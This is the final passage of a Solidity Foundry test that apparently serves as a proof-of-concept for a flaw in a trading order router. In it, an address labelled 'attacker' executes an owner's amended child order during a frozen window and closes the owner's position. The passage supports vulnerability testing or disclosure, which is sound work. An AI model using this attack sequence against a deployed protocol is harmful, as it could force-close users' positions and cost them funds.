        assertEq(ownerChild, newChild + 1, "owner committed amended child");
        assertEq(views_.closeFinancialLimits(pid).maxExecutionNotionalAssets, type(uint256).max, "amend took effect");

        // the amended child executes immediately in the frozen window and closes the position
        vm.prank(address(attacker));
        OrderV3Types.ExecutionResult memory r2 =
            IExecuteOrder(address(router)).executeOrder{value: 1}(ownerChild, _livePayload(SL_PRICE));
        assertEq(uint8(r2.status), uint8(OrderV3Types.LifecycleStatus.Executed), "amended child executed");
        (uint256 size,,,) = _pos(ownerAddr);
        assertEq(size, 0, "position closed");
    }

}
```
